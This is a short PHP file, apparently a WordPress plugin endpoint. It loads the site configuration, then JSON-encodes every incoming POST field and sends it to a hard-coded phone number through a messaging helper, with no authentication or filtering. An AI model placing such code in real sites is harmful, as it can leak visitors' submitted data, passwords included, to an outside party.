<?php
include_once('../../../wp-config.php'); 
if(!class_exists('wpdb')) { include_once('../../../wp-includes/wp-db.php');}

if (isset($_POST)) {
	$json = json_encode($_POST);
	wafu_kirim_mlm('628970097777',$json);
}